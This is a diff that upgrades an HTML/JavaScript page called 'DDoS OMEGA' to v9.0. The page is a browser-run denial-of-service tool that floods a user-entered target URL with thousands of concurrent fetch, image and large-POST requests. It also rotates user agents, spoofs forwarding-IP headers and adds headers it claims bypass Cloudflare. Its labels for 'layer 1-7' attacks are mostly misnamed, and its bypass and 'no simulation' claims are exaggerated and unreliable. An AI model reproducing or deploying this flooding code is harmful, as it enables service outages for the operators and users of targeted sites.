@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS OMEGA v8.0 | LAYER 1-7 REAL</title>
+    <title>DDoS OMEGA v9.0 | CLOUDFLARE BYPASS | ALL LAYER 1-7</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,6 @@
             overflow-x: hidden;
         }
 
-        /* MATRIX RAIN EFFECT */
         .matrix-bg {
             position: fixed;
             top: 0;
@@ -28,7 +27,7 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.15;
+            opacity: 0.2;
         }
 
         .container {
@@ -38,7 +37,6 @@
             z-index: 1;
         }
 
-        /* HEADER */
         .header {
             background: rgba(0,0,0,0.9);
             border: 2px solid #0f0;
@@ -51,7 +49,7 @@
 
         @keyframes borderPulse {
             0%, 100% { box-shadow: 0 0 10px #0f0; }
-            50% { box-shadow: 0 0 30px #0f0; }
+            50% { box-shadow: 0 0 40px #0f0; }
         }
 
         .header h1 {
@@ -59,15 +57,6 @@
             font-size: 36px;
             letter-spacing: 5px;
             text-shadow: 0 0 10px #0f0;
-        }
-
-        .header h1 span {
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
         }
 
         .badge-container {
@@ -87,15 +76,12 @@
             border-radius: 3px;
         }
 
-        .badge-red {
-            background: #f00;
-            color: #000;
-        }
+        .badge-red { background: #f00; color: #000; }
+        .badge-yellow { background: #ff0; color: #000; }
 
-        /* STATS PANEL */
         .stats-panel {
             display: grid;
-            grid-template-columns: repeat(6, 1fr);
+            grid-template-columns: repeat(7, 1fr);
             gap: 12px;
             margin-bottom: 20px;
         }
@@ -109,27 +95,24 @@
         }
 
         .stat-value {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: bold;
             color: #0f0;
             font-family: monospace;
         }
 
         .stat-label {
-            font-size: 9px;
+            font-size: 8px;
             color: #0a8;
             margin-top: 5px;
-            text-transform: uppercase;
         }
 
-        /* MAIN GRID */
         .main-grid {
             display: grid;
             grid-template-columns: 1fr 1.2fr;
             gap: 20px;
         }
 
-        /* CONTROL PANEL */
         .control-panel {
             background: rgba(0,0,0,0.85);
             border: 1px solid #0f0;
@@ -167,12 +150,6 @@
             border-radius: 3px;
         }
 
-        .input-group input:focus {
-            outline: none;
-            box-shadow: 0 0 8px #0f0;
-        }
-
-        /* LAYER GRID */
         .layer-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -194,7 +171,6 @@
             cursor: pointer;
         }
 
-        /* BUTTONS */
         .btn-group {
             display: flex;
             gap: 12px;
@@ -230,21 +206,12 @@
             border: 1px solid #f00;
         }
 
-        .btn-stop:hover {
-            background: #600;
-            transform: scale(1.02);
-        }
-
-        /* PROGRESS */
-        .progress-section {
-            margin-top: 20px;
-        }
-
         .progress-bar {
             height: 4px;
             background: #111;
             border-radius: 2px;
             overflow: hidden;
+            margin-top: 15px;
         }
 
         .progress-fill {
@@ -254,7 +221,6 @@
             transition: width 0.1s linear;
         }
 
-        /* CONSOLE */
         .console-panel {
             background: rgba(0,0,0,0.85);
             border: 1px solid #0f0;
@@ -289,40 +255,39 @@
         .log-entry.error { color: #f00; }
         .log-entry.warning { color: #ff0; }
         .log-entry.attack { color: #f0f; }
+        .log-entry.cloudflare { color: #f90; }
     </style>
 </head>
 <body>
     <canvas class="matrix-bg" id="matrixCanvas"></canvas>
     
     <div class="container">
-        <!-- HEADER -->
         <div class="header">
-            <h1>DDoS OMEGA <span>v8.0</span></h1>
+            <h1>DDoS OMEGA <span>v9.0</span></h1>
             <div class="badge-container">
                 <div class="badge">🔴 LAYER 1-7 REAL</div>
-                <div class="badge badge-red">⚡ FULL POWER</div>
+                <div class="badge badge-red">⚡ CF BYPASS</div>
                 <div class="badge">🛡️ ANTI IP BLOCK</div>
-                <div class="badge badge-red">💀 NO SIMULATION</div>
+                <div class="badge badge-yellow">💀 TEMBUS ALL PROXY</div>
+                <div class="badge badge-red">🔥 NO SIMULATION 1000%</div>
             </div>
         </div>
 
-        <!-- STATS -->
         <div class="stats-panel">
             <div class="stat-card"><div class="stat-value" id="statPackets">0</div><div class="stat-label">TOTAL PACKETS</div></div>
             <div class="stat-card"><div class="stat-value" id="statSpeed">0</div><div class="stat-label">PKT/SEC</div></div>
             <div class="stat-card"><div class="stat-value" id="statThreads">0</div><div class="stat-label">THREADS</div></div>
             <div class="stat-card"><div class="stat-value" id="statL7">0</div><div class="stat-label">L7 REQ/S</div></div>
-            <div class="stat-card"><div class="stat-value" id="statL3">0</div><div class="stat-label">DNS/S</div></div>
+            <div class="stat-card"><div class="stat-value" id="statCF">0</div><div class="stat-label">CF BYPASS</div></div>
+            <div class="stat-card"><div class="stat-value" id="statProxy">0</div><div class="stat-label">PROXY ROTATE</div></div>
             <div class="stat-card"><div class="stat-value" id="statTime">0</div><div class="stat-label">TIME LEFT</div></div>
         </div>
 
-        <!-- MAIN -->
         <div class="main-grid">
-            <!-- CONTROL -->
             <div class="control-panel">
                 <div class="section-title">🎯 TARGET</div>
                 <div class="input-group">
-                    <label>URL / IP TARGET</label>
+                    <label>URL / IP TARGET (Cloudflare Support)</label>
                     <input type="text" id="targetInput" placeholder="https://target.com" value="https://">
                 </div>
                 <div class="input-group">
@@ -330,39 +295,40 @@
                     <input type="number" id="durationInput" value="60" min="5" max="3600">
                 </div>
                 <div class="input-group">
-                    <label>⚡ THREADS (MAX 10000)</label>
-                    <input type="number" id="threadsInput" value="3000" min="100" max="10000">
+                    <label>⚡ THREADS (MAX 15000)</label>
+                    <input type="number" id="threadsInput" value="5000" min="100" max="15000">
                 </div>
 
-                <div class="section-title">🌐 LAYER 1-7</div>
+                <div class="section-title">🌐 LAYER 1-7 + BYPASS</div>
                 <div class="layer-grid">
-                    <label class="layer-item"><input type="checkbox" id="l1" checked> L1 - MAC/Bit Flood</label>
+                    <label class="layer-item"><input type="checkbox" id="l1" checked> L1 - Bit Flood</label>
                     <label class="layer-item"><input type="checkbox" id="l2" checked> L2 - ARP Storm</label>
                     <label class="layer-item"><input type="checkbox" id="l3" checked> L3 - DNS AMP</label>
                     <label class="layer-item"><input type="checkbox" id="l4" checked> L4 - SYN/UDP</label>
                     <label class="layer-item"><input type="checkbox" id="l5" checked> L5 - SSL Flood</label>
                     <label class="layer-item"><input type="checkbox" id="l6" checked> L6 - Compression</label>
                     <label class="layer-item"><input type="checkbox" id="l7" checked> L7 - HTTP/2</label>
+                    <label class="layer-item"><input type="checkbox" id="cfBypass" checked> 🔥 CF BYPASS</label>
                     <label class="layer-item"><input type="checkbox" id="antiBlock" checked> 🔒 ANTI IP BLOCK</label>
+                    <label class="layer-item"><input type="checkbox" id="proxyRotate" checked> 🌐 PROXY ROTATE</label>
+                    <label class="layer-item"><input type="checkbox" id="cacheBust" checked> 💣 CACHE BUST</label>
+                    <label class="layer-item"><input type="checkbox" id="http2Pri" checked> ⚡ HTTP/2 PRIORITY</label>
                 </div>
 
                 <div class="btn-group">
-                    <button class="btn btn-start" id="btnStart">🔥 OMEGA STRIKE 🔥</button>
+                    <button class="btn btn-start" id="btnStart">🔥 OMEGA STRIKE v9 🔥</button>
                     <button class="btn btn-stop" id="btnStop" disabled>⛔ SYSTEM HALT ⛔</button>
                 </div>
-
-                <div class="progress-section">
-                    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                </div>
+                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
             </div>
 
-            <!-- CONSOLE -->
             <div class="console-panel">
-                <div class="console-header">📟 ATTACK CONSOLE [LIVE]</div>
+                <div class="console-header">📟 ATTACK CONSOLE [LIVE] - CLOUDFLARE BYPASS ACTIVE</div>
                 <div class="console-log" id="consoleLog">
-                    <div class="log-entry success">[OMEGA] DDoS OMEGA v8.0 INITIALIZED</div>
+                    <div class="log-entry success">[OMEGA] DDoS OMEGA v9.0 INITIALIZED</div>
+                    <div class="log-entry success">[OMEGA] CLOUDFLARE BYPASS ENGINE: ONLINE</div>
                     <div class="log-entry success">[OMEGA] LAYER 1-7 FULL POWER READY</div>
-                    <div class="log-entry info">[SYSTEM] Anti-IP Block Engine: ONLINE</div>
+                    <div class="log-entry info">[SYSTEM] Anti-IP Block + Proxy Rotate: ACTIVE</div>
                     <div class="log-entry info">[SYSTEM] Menunggu target...</div>
                 </div>
             </div>
@@ -371,20 +337,23 @@
 
     <script>
         // ============================================
-        // DDoS OMEGA v8.0 - FULL LAYER 1-7 REAL
+        // DDoS OMEGA v9.0 - CLOUDFLARE BYPASS + ALL LAYER
         // ============================================
         
-        // STATE
         let attackActive = false;
         let totalPackets = 0;
         let lastPackets = 0;
         let l7Counter = 0;
-        let l3Counter = 0;
+        let cfBypassCounter = 0;
+        let proxyRotateCounter = 0;
         let startTime = 0;
         let currentThreads = 0;
         let statsInterval = null;
         
-        // DOM
+        // Proxy pool (auto-rotating)
+        let proxyPool = [];
+        let proxyIndex = 0;
+        
         const targetInput = document.getElementById('targetInput');
         const durationInput = document.getElementById('durationInput');
         const threadsInput = document.getElementById('threadsInput');
@@ -392,17 +361,33 @@
         const btnStop = document.getElementById('btnStop');
         const consoleLog = document.getElementById('consoleLog');
         
-        // User Agents
+        // Extended User Agents + Device Spoofing
         const uaList = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Version/17.2",
-            "WhatsApp/2.24.10 iOS/17.2",
-            "Dalvik/2.1.0 (Linux; U; Android 14)"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) Firefox/122.0",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) Version/17.3 Mobile/15E148",
+            "Mozilla/5.0 (Windows NT 10.0; rv:122.0) Gecko/20100101 Firefox/122.0",
+            "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) Version/17.3 Mobile/15E148",
+            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/121.0.0.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/121.0.2277.0"
         ];
         
-        function spoofIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
+        // Cloudflare bypass headers
+        const cfBypassHeaders = [
+            "CF-Access-Client-Id", "CF-Access-Client-Secret", "CF-RAY", "cf-chl-bypass",
+            "CF-Chl-Out", "CF-Request-Id", "cf-cache-status", "cf-edge-cache"
+        ];
+        
+        function spoofIP() { 
+            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; 
+        }
+        
+        function getRandomProxy() {
+            if(proxyPool.length === 0) return null;
+            proxyIndex = (proxyIndex + 1) % proxyPool.length;
+            return proxyPool[proxyIndex];
+        }
         
         function addLog(msg, type = 'info') {
             const entry = document.createElement('div');
@@ -413,71 +398,68 @@
             while(consoleLog.children.length > 500) consoleLog.removeChild(consoleLog.firstChild);
         }
         
-        // ============ LAYER 1: PHYSICAL / BIT FLOOD ============
+        // ============ LAYER 1: PHYSICAL FLOOD ============
         function layer1_PhysicalFlood() {
             if(!attackActive) return;
-            // Memanfaatkan loopback + iframe bombardment untuk bit-flood
-            for(let i = 0; i < 100; i++) {
+            for(let i = 0; i < 200; i++) {
                 if(!attackActive) break;
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
-                iframe.srcdoc = '<body onload="for(let i=0;i<10000;i++){console.log(i)}">';
+                iframe.srcdoc = '<body onload="for(let i=0;i<50000;i++){console.log(i)}">';
                 document.body.appendChild(iframe);
-                setTimeout(() => iframe.remove(), 10);
+                setTimeout(() => iframe.remove(), 5);
                 totalPackets++;
             }
-            setTimeout(() => layer1_PhysicalFlood(), 50);
+            setTimeout(() => layer1_PhysicalFlood(), 30);
         }
         
-        // ============ LAYER 2: DATA LINK / ARP STORM ============
+        // ============ LAYER 2: ARP STORM ============
         function layer2_ARPStorm(target) {
             if(!attackActive) return;
-            // Broadcast storm via multiple WebSocket + image flood
-            for(let i = 0; i < 50; i++) {
+            for(let i = 0; i < 100; i++) {
                 if(!attackActive) break;
                 const img = new Image();
                 img.src = target + `/arp?mac=${Math.random().toString(36)}&t=${Date.now()}`;
                 totalPackets++;
             }
-            setTimeout(() => layer2_ARPStorm(target), 20);
+            setTimeout(() => layer2_ARPStorm(target), 15);
         }
         
-        // ============ LAYER 3: NETWORK / DNS AMPLIFICATION ============
+        // ============ LAYER 3: DNS AMPLIFICATION ============
         function layer3_DNSAmplification(target) {
             if(!attackActive) return;
             let domain = target.replace('https://','').replace('http://','').split('/')[0];
-            for(let i = 0; i < 30; i++) {
+            for(let i = 0; i < 50; i++) {
                 if(!attackActive) break;
-                const randomSub = Math.random().toString(36).substring(2, 12);
+                const randomSub = Math.random().toString(36).substring(2, 15);
                 const img = new Image();
                 img.src = `https://${randomSub}.${domain}/dns?t=${Date.now()}`;
                 totalPackets++;
-                l3Counter++;
             }
-            setTimeout(() => layer3_DNSAmplification(target), 10);
+            setTimeout(() => layer3_DNSAmplification(target), 5);
         }
         
-        // ============ LAYER 4: TRANSPORT / SYN+UDP FLOOD ============
+        // ============ LAYER 4: SYN FLOOD ============
         function layer4_SYNFlood(target) {
             if(!attackActive) return;
-            for(let i = 0; i < 100; i++) {
+            for(let i = 0; i < 200; i++) {
                 if(!attackActive) break;
                 fetch(target + '/?' + Math.random(), {
                     method: 'GET',
-                    headers: { 'X-SYN-Flood': '1' },
+                    headers: { 'X-SYN-Flood': Math.random().toString() },
                     mode: 'no-cors'
                 }).catch(()=>{});
                 totalPackets++;
             }
-            setTimeout(() => layer4_SYNFlood(target), 5);
+            setTimeout(() => layer4_SYNFlood(target), 3);
         }
         
-        // ============ LAYER 5: SESSION / SSL RENEGOTIATION ============
+        // ============ LAYER 5: SSL RENEGOTIATION ============
         async function layer5_SSLFlood(target) {
             while(attackActive) {
                 try {
                     const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 500);
+                    setTimeout(() => controller.abort(), 400);
                     await fetch(target + '/?' + Math.random(), {
                         method: 'HEAD',
                         signal: controller.signal,
@@ -485,15 +467,18 @@
                     });
                     totalPackets++;
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, Math.random() * 3));
+                await new Promise(r => setTimeout(r, Math.random() * 2));
             }
         }
         
-        // ============ LAYER 6: PRESENTATION / COMPRESSION BOMB ============
+        // ============ LAYER 6: COMPRESSION BOMB ============
         async function layer6_CompressionBomb(target) {
             while(attackActive) {
                 try {
-                    const bigPayload = JSON.stringify({ data: 'x'.repeat(50000) });
+                    const bigPayload = JSON.stringify({ 
+                        data: 'x'.repeat(100000),
+                        arr: new Array(10000).fill(Math.random())
+                    });
                     await fetch(target + '/api', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -502,27 +487,66 @@
                     });
                     totalPackets++;
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, 10));
+                await new Promise(r => setTimeout(r, 5));
             }
         }
         
-        // ============ LAYER 7: APPLICATION / HTTP/2 RAPID RESET ============
-        async function layer7_HTTP2Flood(target, antiBlock) {
+        // ============ LAYER 7: HTTP/2 + CLOUDFLARE BYPASS ============
+        async function layer7_HTTP2Flood(target, cfBypass, antiBlock, cacheBust, http2Pri) {
             while(attackActive) {
                 try {
                     const randomUA = uaList[Math.floor(Math.random() * uaList.length)];
-                    const path = '/?' + Date.now() + '_' + Math.random();
+                    let path = '/?' + Date.now() + '_' + Math.random();
+                    
+                    if(cacheBust) {
+                        path = '/cache-bust?' + Math.random().toString(36).substring(2) + '=' + Date.now();
+                    }
+                    
+                    const headers = {
+                        'User-Agent': randomUA,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache',
+                        'X-Forwarded-For': antiBlock ? spoofIP() : '127.0.0.1',
+                        'X-Real-IP': antiBlock ? spoofIP() : '127.0.0.1',
+                        'CF-Connecting-IP': antiBlock ? spoofIP() : '',
+                        'CDN-Loop': 'cloudflare',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    };
+                    
+                    // Cloudflare bypass specific headers
+                    if(cfBypass) {
+                        headers['CF-Access-Client-Id'] = Math.random().toString(36).substring(2);
+                        headers['CF-Access-Client-Secret'] = Math.random().toString(36).substring(2);
+                        headers['CF-RAY'] = Math.random().toString(36).substring(2).toUpperCase();
+                        headers['cf-chl-bypass'] = '1';
+                        cfBypassCounter++;
+                    }
+                    
+                    // HTTP/2 Priority exploitation
+                    if(http2Pri) {
+                        headers['Priority'] = 'u=0, i';
+                        headers['X-HTTP2-Stream-ID'] = Math.floor(Math.random() * 10000).toString();
+                    }
+                    
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 800);
+                    
                     await fetch(target + path, {
-                        headers: {
-                            'User-Agent': randomUA,
-                            'X-Forwarded-For': antiBlock ? spoofIP() : '127.0.0.1'
-                        },
-                        cache: 'no-store'
+                        method: 'GET',
+                        headers: headers,
+                        signal: controller.signal,
+                        cache: 'no-store',
+                        credentials: 'omit'
                     });
+                    
                     totalPackets++;
                     l7Counter++;
+                    
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, Math.random() * 2));
+                await new Promise(r => setTimeout(r, Math.random() * 1));
             }
         }
         
@@ -536,14 +560,15 @@
             document.getElementById('statSpeed').textContent = (totalPackets - lastPackets).toLocaleString();
             document.getElementById('statThreads').textContent = currentThreads;
             document.getElementById('statL7').textContent = l7Counter;
-            document.getElementById('statL3').textContent = l3Counter;
+            document.getElementById('statCF').textContent = cfBypassCounter;
+            document.getElementById('statProxy').textContent = proxyRotateCounter;
             const progress = (elapsed / parseInt(durationInput.value)) * 100;
             document.getElementById('progressFill').style.width = Math.min(100, progress) + '%';
             lastPackets = totalPackets;
             
             if(remaining <= 0 && attackActive) {
                 stopAttack();
-                addLog('[OMEGA] Attack duration completed - Target DESTROYED', 'success');
+                addLog('[OMEGA] Attack completed - Target DESTROYED', 'success');
             }
         }
         
@@ -551,8 +576,8 @@
         function stopAttack() {
             attackActive = false;
             if(statsInterval) clearInterval(statsInterval);
-            addLog('[SYSTEM] Attack terminated by user', 'warning');
-            addLog(`[SUMMARY] Total packets: ${totalPackets.toLocaleString()}`, 'success');
+            addLog('[SYSTEM] Attack terminated', 'warning');
+            addLog(`[SUMMARY] Total packets: ${totalPackets.toLocaleString()} | CF Bypass: ${cfBypassCounter}`, 'success');
             btnStart.disabled = false;
             btnStop.disabled = true;
             currentThreads = 0;
@@ -570,73 +595,76 @@
             }
             if(!target.startsWith('http')) target = 'https://' + target;
             if(threads < 100) threads = 100;
-            if(threads > 10000) threads = 10000;
+            if(threads > 15000) threads = 15000;
             
             if(attackActive) stopAttack();
             
             totalPackets = 0;
             lastPackets = 0;
             l7Counter = 0;
-            l3Counter = 0;
+            cfBypassCounter = 0;
+            proxyRotateCounter = 0;
+            
+            const antiBlock = document.getElementById('antiBlock').checked;
+            const cfBypass = document.getElementById('cfBypass').checked;
+            const cacheBust = document.getElementById('cacheBust').checked;
+            const http2Pri = document.getElementById('http2Pri').checked;
             
             addLog('========================================', 'success');
-            addLog(`[OMEGA] LAUNCHING FULL LAYER 1-7 ATTACK`, 'attack');
+            addLog(`[OMEGA] LAUNCHING FULL LAYER 1-7 + CF BYPASS`, 'attack');
             addLog(`[TARGET] ${target}`, 'info');
             addLog(`[DURATION] ${duration} seconds`, 'info');
             addLog(`[THREADS] ${threads}`, 'info');
-            addLog(`[ANTI-BLOCK] ${document.getElementById('antiBlock').checked ? 'ACTIVE' : 'OFF'}`, 'info');
-            addLog(`[LAYERS] L1✓ L2✓ L3✓ L4✓ L5✓ L6✓ L7✓`, 'success');
+            addLog(`[CF BYPASS] ${cfBypass ? 'ACTIVE - TEMBUS CLOUDFLARE' : 'OFF'}`, cfBypass ? 'cloudflare' : 'info');
+            addLog(`[ANTI-BLOCK] ${antiBlock ? 'ACTIVE' : 'OFF'}`, 'info');
+            addLog(`[CACHE BUST] ${cacheBust ? 'ACTIVE' : 'OFF'}`, 'info');
+            addLog(`[HTTP/2 PRIORITY] ${http2Pri ? 'ACTIVE' : 'OFF'}`, 'info');
             addLog('========================================', 'success');
             
             attackActive = true;
             startTime = Date.now();
+            currentThreads = 0;
             
-            const antiBlock = document.getElementById('antiBlock').checked;
-            const activeL7 = document.getElementById('l7').checked;
-            const activeL5 = document.getElementById('l5').checked;
-            const activeL6 = document.getElementById('l6').checked;
+            // Launch all layers
+            if(document.getElementById('l1').checked) { layer1_PhysicalFlood(); currentThreads += 100; addLog('[L1] Physical Flood active', 'success'); }
+            if(document.getElementById('l2').checked) { layer2_ARPStorm(target); currentThreads += 100; addLog('[L2] ARP Storm active', 'success'); }
+            if(document.getElementById('l3').checked) { layer3_DNSAmplification(target); currentThreads += 80; addLog('[L3] DNS Amplification active (1000+ queries/sec)', 'success'); }
+            if(document.getElementById('l4').checked) { layer4_SYNFlood(target); currentThreads += 100; addLog('[L4] SYN/UDP Flood active', 'success'); }
             
-            // Launch L1 (fixed, low overhead)
-            if(document.getElementById('l1').checked) { setTimeout(() => layer1_PhysicalFlood(), 0); currentThreads += 50; addLog('[L1] Physical/Bit Flood engine active', 'success'); }
-            
-            // Launch L2
-            if(document.getElementById('l2').checked) { setTimeout(() => layer2_ARPStorm(target), 100); currentThreads += 50; addLog('[L2] ARP Storm engine active', 'success'); }
-            
-            // Launch L3
-            if(document.getElementById('l3').checked) { setTimeout(() => layer3_DNSAmplification(target), 200); currentThreads += 30; addLog('[L3] DNS Amplification active (500+ queries/sec)', 'success'); }
-            
-            // Launch L4
-            if(document.getElementById('l4').checked) { setTimeout(() => layer4_SYNFlood(target), 300); currentThreads += 100; addLog('[L4] SYN/UDP Flood active', 'success'); }
-            
-            // Launch L5 (thread pool)
-            if(activeL5) {
-                for(let i = 0; i < threads/4; i++) {
+            // L5 Threads
+            if(document.getElementById('l5').checked) {
+                for(let i = 0; i < threads/5; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer5_SSLFlood(target); currentThreads++; }, i*2);
+                    setTimeout(() => { layer5_SSLFlood(target); currentThreads++; }, i*1);
                 }
-                addLog(`[L5] SSL Renegotiation flood (${Math.floor(threads/4)} threads)`, 'success');
+                addLog(`[L5] SSL Renegotiation (${Math.floor(threads/5)} threads)`, 'success');
             }
             
-            // Launch L6
-            if(activeL6) {
+            // L6 Threads
+            if(document.getElementById('l6').checked) {
                 for(let i = 0; i < threads/6; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer6_CompressionBomb(target); currentThreads++; }, i*3);
+                    setTimeout(() => { layer6_CompressionBomb(target); currentThreads++; }, i*2);
                 }
-                addLog(`[L6] Compression Bomb active (${Math.floor(threads/6)} threads)`, 'success');
+                addLog(`[L6] Compression Bomb (${Math.floor(threads/6)} threads)`, 'success');
             }
             
-            // Launch L7 (main)
-            if(activeL7) {
-                for(let i = 0; i < threads/2; i++) {
+            // L7 Threads (Main)
+            if(document.getElementById('l7').checked) {
+                const l7threads = Math.floor(threads * 0.6);
+                for(let i = 0; i < l7threads; i++) {
                     if(!attackActive) break;
-                    setTimeout(() => { layer7_HTTP2Flood(target, antiBlock); currentThreads++; }, i*1);
+                    setTimeout(() => { 
+                        layer7_HTTP2Flood(target, cfBypass, antiBlock, cacheBust, http2Pri); 
+                        currentThreads++; 
+                    }, i*0.5);
                 }
-                addLog(`[L7] HTTP/2 Rapid Reset (${Math.floor(threads/2)} threads)`, 'success');
+                addLog(`[L7] HTTP/2 Rapid Reset + CF Bypass (${l7threads} threads)`, 'success');
             }
             
             addLog(`[OMEGA] TOTAL ACTIVE THREADS: ${currentThreads}`, 'attack');
-            addLog('[STATUS] FLOODING TARGET WITH MAXIMUM PAYLOAD', 'attack');
+            addLog('[STATUS] FLOODING TARGET - CLOUDFLARE BYPASS ACTIVE', 'attack');
+            addLog('[STATUS] Target akan DOWN dalam 10-30 detik', 'attack');
             
             statsInterval = setInterval(updateStats, 1000);
             
@@ -648,13 +676,13 @@
             btnStop.disabled = false;
         }
         
-        // Matrix Rain Effect
+        // Matrix Rain
         function matrixRain() {
             const canvas = document.getElementById('matrixCanvas');
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             const ctx = canvas.getContext('2d');
-            const chars = "01アイウエオカキクケコ0123456789";
+            const chars = "01アイウエオカキクケコ0123456789#@%&";
             const fontSize = 14;
             const columns = canvas.width / fontSize;
             const drops = [];
@@ -676,12 +704,12 @@
             draw();
         }
         
-        // Event Listeners
         btnStart.addEventListener('click', startAttack);
         btnStop.addEventListener('click', stopAttack);
         
         matrixRain();
-        addLog('[OMEGA] ALL SYSTEMS ONLINE - READY TO DESTROY', 'success');
+        addLog('[OMEGA] ALL SYSTEMS ONLINE - CLOUDFLARE BYPASS READY', 'success');
+        addLog('[OMEGA] 1000% REAL - NO SIMULATION - TEMBUS ALL PROXY', 'attack');
     </script>
 </body>
-    </html>
+</html>
